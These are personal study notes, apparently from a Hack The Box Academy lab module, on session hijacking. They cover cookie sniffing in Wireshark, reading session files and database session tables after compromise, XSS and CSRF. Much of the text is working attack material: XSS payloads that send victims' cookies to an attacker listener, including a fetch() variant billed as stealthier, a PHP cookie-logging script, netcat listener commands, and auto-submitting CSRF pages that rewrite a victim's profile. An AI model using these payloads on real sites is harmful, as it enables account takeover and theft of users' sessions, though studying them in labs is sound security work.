# Session Fixation
session fixation vulnerability if:
- The assigned session identifier pre-login remains the same post-login `and`
- Session identifiers (such as cookies) are being accepted from _URL Query Strings_ or _Post Data_ and propagated to the application

# Obtaining Session Identifiers without User Interaction
## Obtaining Session Identifiers via Traffic Sniffing
Inside Wireshark, first, apply a filter to see only HTTP traffic. This can be done as follows (don't forget to press Enter after specifying the filter). ![image](https://academy.hackthebox.com/storage/modules/153/2.png)

Now search within the Packet bytes for any `auth-session` cookies as follows.

Navigate to `Edit` -> `Find Packet` ![image](https://academy.hackthebox.com/storage/modules/153/4.png)

Left-click on `Packet list` and then click `Packet bytes` ![image](https://academy.hackthebox.com/storage/modules/153/5.png)

Select `String` on the third drop-down menu and specify `auth-session` on the field next to it. Finally, click `Find`. Wireshark will present you with the packets that include an `auth-session` string. ![image](https://academy.hackthebox.com/storage/modules/153/6.png)

The cookie can be copied by right-clicking on a row that contains it, then clicking on `Copy` and finally clicking `Value`. ![image](https://academy.hackthebox.com/storage/modules/153/8.png)

**Part 4: Hijack the victim's session**

Back to the browser window using which you first browsed the application (not the Private Window), open Web Developer Tools, navigate to _storage_, and change your current cookie's value to the one you obtained through Wireshark (remember to remove the `auth-session=` part). ![image](https://academy.hackthebox.com/storage/modules/153/9.png)

If you refresh the page, you will see that you are now logged in as the victim! ![image](https://academy.hackthebox.com/storage/modules/153/10.png)

## Obtaining Session Identifiers Post-Exploitation (Web Server Access)
### PHP
The entry `session.save_path` in `PHP.ini` specifies where session data will be stored.

```shell-session
alakin2504@htb[/htb]$ locate php.ini
alakin2504@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
alakin2504@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

![image](https://academy.hackthebox.com/storage/modules/153/11.png)

In our default configuration case it's `/var/lib/php/sessions`. Now, please note a victim has to be authenticated for us to view their session identifier. The files an attacker will search for use the name convention `sess_<sessionID>`.

How a PHP session identifier looks on our local setup. ![image](https://academy.hackthebox.com/storage/modules/153/12.png)

The same PHP session identifier but on the webserver side looks as follows.

```shell-session
alakin2504@htb[/htb]$ ls /var/lib/php/sessions
alakin2504@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```

![image](https://academy.hackthebox.com/storage/modules/153/13.png)
### Java

"The `Manager` element represents the _session manager_ that is used to create and maintain HTTP sessions of a web application.

Tomcat provides two standard implementations of `Manager`. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate `Store` nested element. The filename of the default session data file is `SESSIONS.ser`."

You can find more information [here](http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html).

---

### .NET

Session data can be found in:

- The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
- An SQL Server

Please refer to the following resource for more in-depth details: [Introduction To ASP.NET Sessions](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)

---

## Obtaining Session Identifiers Post-Exploitation (Database Access)

In cases where you have direct access to a database via, for example, SQL injection or identified credentials, you should always check for any stored user sessions. See an example below.

```sql
show databases;
use project;
show tables;
select * from users;
```

![image](https://academy.hackthebox.com/storage/modules/153/14.png)

Here we can see the users' passwords are hashed. We could spend time trying to crack these; however, there is also a "all_sessions" table. Let us extract data from that table.

```sql
select * from all_sessions;
select * from all_sessions where id=3;

```

![image](https://academy.hackthebox.com/storage/modules/153/15.png)




# Through XSS
=MUST MATCH THESE CONDITIONS=
- found a vulnerable input ( it is best to use payloads with event handlers like `onload` or `onerror` since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like `onmouseover`.)
- _HTTPOnly_ is off

> [!NOTE]
> 
> **Note**: If you're doing testing in the real world, try using something like [XSSHunter](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

A sample HTTPS>HTTPS payload example can be found below:
```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
## With PHP
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

```shell-session
alakin2504@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

Payload:

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

## Obtaining session cookies via XSS (Netcat edition)
```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

```shell-session
alakin2504@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

We don't necessarily have to use the `window.location()` object that causes victims to get redirected. We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.

```javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

# Cross-Site Request Forgery (CSRF or XSRF)

First, create and serve the below HTML page. Save it as `notmalicious.html`
```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
If you are wondering how we ended up with the above form, please see the image below. ![image](https://academy.hackthebox.com/storage/modules/153/29.png)

We can serve the page above from our attacking machine as follows.

```shell-session
alakin2504@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

No need for a proxy at this time, so don't make your browser go through Burp Suite. Restore the browser's original proxy settings.

While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious.html`. You will notice that Ela Stienen's profile details will change to the ones we specified in the HTML page we are serving.

# Cross-Site Request Forgery (GET-based)
First, create and serve the below HTML page. Save it as `notmalicious_get.html`
```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.
```shell-session
alakin2504@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.
